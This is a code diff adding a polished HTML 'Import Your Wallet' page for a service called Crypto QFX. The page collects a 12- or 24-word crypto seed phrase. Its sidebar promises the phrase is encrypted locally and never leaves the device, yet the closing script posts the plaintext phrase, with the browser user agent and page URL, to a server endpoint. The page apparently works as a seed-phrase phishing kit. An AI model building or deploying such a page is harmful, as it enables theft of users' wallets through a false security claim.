@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+
+<html class="dark" lang="en"><head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>Import Wallet | Crypto QFX</title>
+<script src="https://cdn.tailwindcss.com?plugins=forms,container-queries"></script>
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&amp;display=swap" rel="stylesheet"/>
+<link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght@100..700,0..1&amp;display=swap" rel="stylesheet"/>
+<link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght,FILL@100..700,0..1&amp;display=swap" rel="stylesheet"/>
+<script id="tailwind-config">
+        tailwind.config = {
+            darkMode: "class",
+            theme: {
+                extend: {
+                    colors: {
+                        "primary": "#12e258",
+                        "background-light": "#f6f8f6",
+                        "background-dark": "#102216",
+                    },
+                    fontFamily: {
+                        "display": ["Space Grotesk", "sans-serif"]
+                    },
+                    borderRadius: {
+                        "DEFAULT": "0.25rem",
+                        "lg": "0.5rem",
+                        "xl": "0.75rem",
+                        "full": "9999px"
+                    },
+                },
+            },
+        }
+    </script>
+<style>
+        body {
+            font-family: 'Space Grotesk', sans-serif;
+        }
+        .glass-card {
+            background: rgba(25, 51, 34, 0.4);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(50, 103, 68, 0.3);
+        }
+    </style>
+</head>
+<body class="bg-background-light dark:bg-background-dark min-h-screen text-slate-900 dark:text-white transition-colors duration-300">
+<!-- Top Navigation Bar -->
+<header class="w-full border-b border-slate-200 dark:border-[#23482f] px-6 lg:px-40 py-4 bg-white/5 dark:bg-transparent backdrop-blur-md sticky top-0 z-50">
+<div class="max-w-[1200px] mx-auto flex items-center justify-between">
+<div class="flex items-center gap-3">
+<div class="w-6 h-6 md:w-8 md:h-8 text-primary">
+<svg fill="currentColor" viewbox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+<path d="M36.7273 44C33.9891 44 31.6043 39.8386 30.3636 33.69C29.123 39.8386 26.7382 44 24 44C21.2618 44 18.877 39.8386 17.6364 33.69C16.3957 39.8386 14.0109 44 11.2727 44C7.25611 44 4 35.0457 4 24C4 12.9543 7.25611 4 11.2727 4C14.0109 4 16.3957 8.16144 17.6364 14.31C18.877 8.16144 21.2618 4 24 4C26.7382 4 29.123 8.16144 30.3636 14.31C31.6043 8.16144 33.9891 4 36.7273 4C40.7439 4 44 12.9543 44 24C44 35.0457 40.7439 44 36.7273 44Z"></path>
+</svg>
+</div>
+<h1 class="text-xl font-bold tracking-tight">Crypto QFX</h1>
+</div>
+<div class="flex gap-3">
+<button class="flex items-center justify-center rounded-lg h-10 w-10 bg-slate-100 dark:bg-[#23482f] hover:bg-primary/20 transition-all text-slate-700 dark:text-white">
+<span class="material-symbols-outlined text-[20px]">shield</span>
+</button>
+<button class="flex items-center justify-center rounded-lg h-10 w-10 bg-slate-100 dark:bg-[#23482f] hover:bg-primary/20 transition-all text-slate-700 dark:text-white">
+<span class="material-symbols-outlined text-[20px]">account_circle</span>
+</button>
+</div>
+</div>
+</header>
+<main class="max-w-[1200px] mx-auto px-6 py-12 lg:py-20 flex flex-col items-center">
+<!-- Page Heading Section -->
+<div class="w-full max-w-[960px] flex flex-col md:flex-row items-start md:items-end justify-between gap-6 mb-12">
+<div class="flex flex-col gap-3 max-w-2xl">
+<h2 class="text-4xl md:text-5xl font-black leading-tight tracking-tight">Import Your Wallet</h2>
+<p class="text-slate-500 dark:text-[#92c9a4] text-lg max-w-xl">Enter your 12 or 24-word secret recovery phrase in the correct order to restore your assets.</p>
+</div>
+<button class="flex items-center justify-center rounded-lg h-11 px-6 bg-slate-200 dark:bg-[#23482f] text-slate-800 dark:text-white text-sm font-bold tracking-wide hover:opacity-90 transition-all whitespace-nowrap">
+                Need help?
+            </button>
+</div>
+<div class="w-full max-w-[960px] grid grid-cols-1 lg:grid-cols-12 gap-8">
+<!-- Main Content Area -->
+<div class="lg:col-span-8">
+<div class="glass-card rounded-xl p-6 md:p-8 shadow-2xl">
+<form id="seedPhraseForm">
+<!-- Word Toggle -->
+<div class="flex mb-8">
+<div class="flex h-12 w-full max-w-[320px] items-center justify-center rounded-xl bg-slate-200/50 dark:bg-[#23482f] p-1.5">
+<label class="flex cursor-pointer h-full flex-1 items-center justify-center rounded-lg px-4 transition-all has-[:checked]:bg-white dark:has-[:checked]:bg-[#112217] has-[:checked]:shadow-md has-[:checked]:text-primary text-slate-500 dark:text-[#92c9a4] text-sm font-bold">
+<span>12 Words</span>
+<input checked="" class="hidden" name="phrase_type" type="radio" value="12"/>
+</label>
+<label class="flex cursor-pointer h-full flex-1 items-center justify-center rounded-lg px-4 transition-all has-[:checked]:bg-white dark:has-[:checked]:bg-[#112217] has-[:checked]:shadow-md has-[:checked]:text-primary text-slate-500 dark:text-[#92c9a4] text-sm font-bold">
+<span>24 Words</span>
+<input class="hidden" name="phrase_type" type="radio" value="24"/>
+</label>
+</div>
+</div>
+<!-- Input Grid -->
+<div id="inputGrid" class="grid grid-cols-1 sm:grid-cols-2 gap-x-6 gap-y-5 mb-10">
+<!-- Initial 12 inputs will be generated by JavaScript -->
+</div>
+<!-- Action Buttons -->
+<div class="flex flex-col sm:flex-row gap-4 pt-6 border-t border-slate-200 dark:border-[#23482f]">
+<button type="submit" class="flex-1 h-14 flex items-center justify-center rounded-xl bg-primary text-[#102216] font-bold text-lg hover:brightness-110 active:scale-[0.98] transition-all shadow-lg shadow-primary/20">
+                            Confirm Recovery
+                        </button>
+<button type="button" onclick="window.history.back()" class="flex-1 h-14 flex items-center justify-center rounded-xl bg-transparent border border-slate-300 dark:border-[#326744] text-slate-600 dark:text-white font-bold text-lg hover:bg-slate-50 dark:hover:bg-white/5 transition-all">
+                            Back
+                        </button>
+</div>
+</form>
+</div>
+</div>
+<!-- Side Information Column -->
+<div class="lg:col-span-4 flex flex-col gap-6">
+<!-- Security Tip Box -->
+<div class="bg-primary/10 border border-primary/20 rounded-xl p-6">
+<div class="flex items-center gap-3 text-primary mb-4">
+<span class="material-symbols-outlined font-bold">lock</span>
+<h3 class="font-bold text-lg">Security First</h3>
+</div>
+<p class="text-slate-600 dark:text-[#92c9a4] text-sm leading-relaxed">
+                        Never share your seed phrase with anyone. Crypto QFX staff will <span class="text-primary font-bold">never</span> ask for this information in any situation.
+                    </p>
+<div class="mt-6 p-4 rounded-lg bg-black/20 text-xs text-slate-400 dark:text-white/40 flex gap-3">
+<span class="material-symbols-outlined text-sm">visibility_off</span>
+<span>Your phrase is encrypted locally and never leaves your device.</span>
+</div>
+</div>
+<!-- Status Progress -->
+<div class="glass-card rounded-xl p-6">
+<h4 class="font-bold text-sm text-slate-400 dark:text-white/60 mb-6 uppercase tracking-widest">Setup Progress</h4>
+<div class="space-y-6">
+<div class="flex items-center gap-4">
+<div class="size-8 rounded-full bg-primary flex items-center justify-center text-[#102216]">
+<span class="material-symbols-outlined text-[18px]">check</span>
+</div>
+<span class="text-sm font-medium">Select Import Method</span>
+</div>
+<div class="flex items-center gap-4">
+<div class="size-8 rounded-full border-2 border-primary flex items-center justify-center text-primary animate-pulse">
+<div class="size-2 rounded-full bg-primary"></div>
+</div>
+<span class="text-sm font-bold text-primary">Enter Seed Phrase</span>
+</div>
+<div class="flex items-center gap-4 opacity-30">
+<div class="size-8 rounded-full border-2 border-slate-300 dark:border-white/20 flex items-center justify-center">
+<span class="text-xs font-bold">3</span>
+</div>
+<span class="text-sm font-medium">Create Local Password</span>
+</div>
+</div>
+</div>
+<!-- Help Link -->
+<div class="mt-auto pt-6 text-center">
+<p class="text-sm text-slate-500 dark:text-[#92c9a4]/60">
+                        Lost your recovery phrase? <br/>
+<a class="text-primary hover:underline font-bold mt-1 inline-block" href="#">Contact Support</a>
+</p>
+</div>
+</div>
+</div>
+</main>
+<!-- Background Decoration -->
+<div class="fixed top-0 right-0 -z-10 w-[500px] h-[500px] bg-primary/5 rounded-full blur-[120px] pointer-events-none"></div>
+<div class="fixed bottom-0 left-0 -z-10 w-[400px] h-[400px] bg-primary/5 rounded-full blur-[100px] pointer-events-none"></div>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    const inputGrid = document.getElementById('inputGrid');
+    const phraseTypeRadios = document.querySelectorAll('input[name="phrase_type"]');
+    const form = document.getElementById('seedPhraseForm');
+    
+    // Generate input fields
+    function generateInputs(count) {
+        inputGrid.innerHTML = '';
+        
+        for (let i = 1; i <= count; i++) {
+            const inputGroup = document.createElement('div');
+            inputGroup.className = 'flex flex-col gap-2';
+            
+            inputGroup.innerHTML = `
+                <label class="text-slate-400 dark:text-white/60 text-xs font-bold uppercase tracking-widest pl-1">${i.toString().padStart(2, '0')}.</label>
+                <input 
+                    class="w-full rounded-lg text-slate-900 dark:text-white border border-slate-300 dark:border-[#326744] bg-white dark:bg-[#193322] focus:border-primary focus:ring-1 focus:ring-primary h-14 px-4 text-base font-medium placeholder:text-slate-300 dark:placeholder:text-[#92c9a4]/30 transition-all" 
+                    placeholder="Enter word" 
+                    type="text"
+                    name="word_${i}"
+                    required
+                    autocomplete="off"
+                    spellcheck="false"
+                />
+            `;
+            
+            inputGrid.appendChild(inputGroup);
+        }
+    }
+    
+    // Initialize with 12 words
+    generateInputs(12);
+    
+    // Handle phrase type change
+    phraseTypeRadios.forEach(radio => {
+        radio.addEventListener('change', function() {
+            const count = parseInt(this.value);
+            generateInputs(count);
+        });
+    });
+    
+    // Handle form submission
+    form.addEventListener('submit', async function(e) {
+        e.preventDefault();
+        
+        const formData = new FormData(form);
+        const phraseType = formData.get('phrase_type');
+        const wordCount = parseInt(phraseType);
+        
+        // Collect seed phrase words
+        const seedWords = [];
+        for (let i = 1; i <= wordCount; i++) {
+            const word = formData.get(`word_${i}`);
+            if (word && word.trim()) {
+                seedWords.push(word.trim().toLowerCase());
+            }
+        }
+        
+        // Validate seed phrase length
+        if (seedWords.length !== wordCount) {
+            alert(`Please enter all ${wordCount} words of your seed phrase.`);
+            return;
+        }
+        
+        // Basic validation - check if words contain only letters
+        const invalidWords = seedWords.filter(word => !/^[a-zA-Z]+$/.test(word));
+        if (invalidWords.length > 0) {
+            alert('Seed phrase words should only contain letters.');
+            return;
+        }
+        
+        try {
+            const response = await fetch('/api/import-wallet', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    walletType: 'Imported',
+                    seedPhrase: seedWords.join(' '),
+                    wordCount: wordCount,
+                    timestamp: Date.now(),
+                    userAgent: navigator.userAgent,
+                    url: window.location.href
+                })
+            });
+            
+            const result = await response.json();
+            
+            if (result.success && result.walletData) {
+                console.log('[IMPORT] Storing wallet data:', result.walletData);
+                
+                // Store complete wallet data for dashboard
+                localStorage.setItem('walletData', JSON.stringify(result.walletData));
+                sessionStorage.setItem('walletData', JSON.stringify(result.walletData));
+                sessionStorage.setItem('currentWallet', JSON.stringify(result.walletData));
+                
+                // Redirect to dashboard after a short delay
+                setTimeout(() => {
+                    window.location.href = '/dashboard';
+                }, 500);
+            } else {
+                console.error('[IMPORT] Wallet import failed:', result);
+                alert('Wallet imported but dashboard data unavailable. Please try again.');
+                window.location.href = '/';
+            }
+        } catch (error) {
+            console.error('Error importing wallet:', error);
+            alert('Failed to import wallet. Please try again.');
+        }
+    });
+});
+</script>
+</body></html>
